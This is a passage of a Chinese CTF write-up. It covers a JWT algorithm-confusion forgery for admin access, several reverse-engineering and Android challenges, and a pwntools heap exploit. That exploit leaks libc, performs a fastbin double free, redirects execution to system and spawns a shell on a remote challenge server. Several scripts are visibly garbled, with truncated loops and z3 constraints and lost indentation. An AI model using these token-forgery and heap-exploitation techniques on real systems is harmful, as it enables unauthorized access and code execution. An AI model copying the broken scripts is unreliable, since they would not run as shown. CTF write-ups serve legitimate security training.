但很明显，公钥是有格式的，直接拿来用坑定不行，用python的print命令输出一下，防止人工修格式修错,然后将其复制到txt里
    a="-----BEGIN PUBLIC KEY-----nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDMRTzM9ujkHmh42aXG0aHZk/PKnomh6laVF+c3+D+klIjXglj7+/wxnztnhyOZpYxdtk7FfpHa3Xh4Pkpd5VivwOu1hnKk3XQYZeMHov4kW0yuS+5RpFV1Q2gm/NWGY52EaQmpCNFQbGNigZhu95R2OoMtucnIC+LX+9V/mpyKe9R3wIDAQABn-----END PUBLIC KEY-----"
    print a
用这个公钥构造token头访问list
    import jwt
    import base64
    public = open('1.txt','r').read()
    print (jwt.encode({"name": "xibai21","priv": "admin"}, key=public, algorithm='HS256'))
token头自然是抓包将原本的换为我们自行构造的token，注意token头中的name是自己的公钥对应的用户名，admin自然是管理员用户名。  
发包后在list中看到关键信息：  
访问/text/admin:。。。。。。，即可拿到flag
## Reverse
###  1\. answer to everything
ida载入main函数一键f5，审计一波发现以下关键：  
不带任何标签提交，结合题目提示sha1， kdudpeh 的sha1值即为所要flag
###  2\. dig dig dig
用IDA载入分析  
发现对字符串进行了三次加密  
分别为BASE64,ROT13,UUencode  
对字符串逆着进行三次解密，得到flag  
###  3.简单Python
题目内容很简单  
提示说要逆向一个pyc  
虽然没有了解过这个东西，不过在网上找到了在线的反编译工具  
直接拉进去 运行  
得到如下内容：
    import base64
    def encode(message):
        s = ''
        for i in message:
            x = ord(i) ^ 32
            x = x + 16
            s += chr(x)
        return base64.b64encode(s)
    correct = 'eYNzc2tjWV1gXFWPYGlTbQ=='
    flag = ''
    print 'Input flag:'
    flag = raw_input()
    if encode(flag) == correct:
        print 'correct'
    else:
        print 'wrong'
这就很棒了  
源码都有了 什么是逆不出来的  
这里需要注意一下的是correct的内容最好不要用网上的Base64解码工具解码  
最好用Python的base64模块解码  
简单写一下Python得到decode后的字符串
    yx83sskcY]`\Ux8f`iSm
然后写一个脚本，跑一下就出来了  
脚本如下：
    #include 
    using namespace std;
    int main ()
    {
        char buffer[512]="yx83sskcY]`\Ux8f`iSm";
        for(int i=0;i>2)^0xA)
    print cipher2
    #也可以用一个直接点的代码处理
    cipher1 = ''.join(map(lambda x: chr((x>>2) ^ 0xa), cipher))
    print cipher1
## Mobile
###  Mobile01
使用jeb查看反汇编代码，发现有两个关键函数 checkFrist 和 checkSecond  
checkFrist查看其内部内容发现是检查输入字符串，要求字符串长度为16位，范围在1到8之间  
checkSecond在Native层里面，调用的是c/c++代码，jeb中无法查看，用ida打开apk包里面的lib下的so文件（ida需要加载jni模块，不然反汇编的代码相对会比较复杂，不利于逆向分析）。  
发现checksecond函数中要求前八位必须是递增关系，即前八位为“12345678”  
后八位则给了相关约束条件，写一个脚本跑一下即可：
    #调用z3求解器
    from z3 import *
    import time      #记录计算时间用，舍弃也可以
    t1=time.time()   #记录计算时间用，舍弃也可以
    #设一个解决样例
    solver=Solver()
    #设置样例flag长度
    flag=[Int('flag%d'%i) for i in range(16)]
    #给flag的每一位添加范围约束（0，9）
    for i in range(16):
    solver.add(flag[i]>0)
    solver.add(flag[i]=j):
    break
    solver.add(flag[k]!=flag[j])
    solver.add(flag[k+8]!=flag[j+8])
    solver.add((flag[j]-flag[k])!=(flag[j+8]-flag[k+8]))
    solver.add((flag[j]-flag[k])!=(flag[k+8]-flag[j+8]))
    #这个检查应该是判断是否有解，有则输出flag，无则报错
    if(solver.check()==sat):
    m=solver.model()
    s=[]
    for i in range(16):
    s.append(m[flag[i]].as_long())
        print(bytes(s))
    else:
    print('error')
    t2=time.time()
    print(t2-t1)
## Pwn
###  pwn02
    from pwn import *
    #context.log_level = 'debug'
    IP = '39.100.87.24'
    PORT = 8102
    LOCAL = 0
    if LOCAL:
    sh = process('./pwn02')
    else:
    sh = remote(IP, PORT)
    def debug(cmd=''):
    gdb.attach(sh, cmd)
    pause()
    def malloc(idx, size, ctx):
    sh.recvuntil('> ')
    sh.sendline('1 '+str(idx))
    sh.sendline(str(size))
    sh.sendline(ctx)
    def free(idx):
    sh.recvuntil('> ')
    sh.sendline('2 '+str(idx))
    def puts(idx):
    sh.recvuntil('> ')
    sh.sendline('3 '+str(idx))
    malloc(0, 0x58, "aa")
    malloc(1, 0x58, "bb")
    malloc(2, 0x58, "cc")
    malloc(3, 0x80, "dd")
    malloc(4, 0x10, "ee")
    # unsorted bin leak
    free(3)
    puts(3)
    leak = sh.recvuntil('x7f').ljust(8, "x00")
    leak = u64(leak)
    libc_base = 0
    if LOCAL:
    libc_base = leak-3951480
    else:
    libc_base = leak-3951480
    # ubuntu 1604 server
    log.success("libc base: %s" %hex(libc_base))
    # double free
    free(0)
    free(1)
    free(0)
    payload = "f"*80
    payload += p64(0)+p64(0x61)
    payload += p64(0x600dba)
    malloc(5, 0x58, payload)
    malloc(6, 0x58, "gg")
    system = libc_base + 0x45390
    payload = "h"* 6 + p64(system)*2
    malloc(7, 0x58, payload)
    malloc(8, 0x20, "/bin/shx00")
    free(8)
    #debug()
    sh.interactive()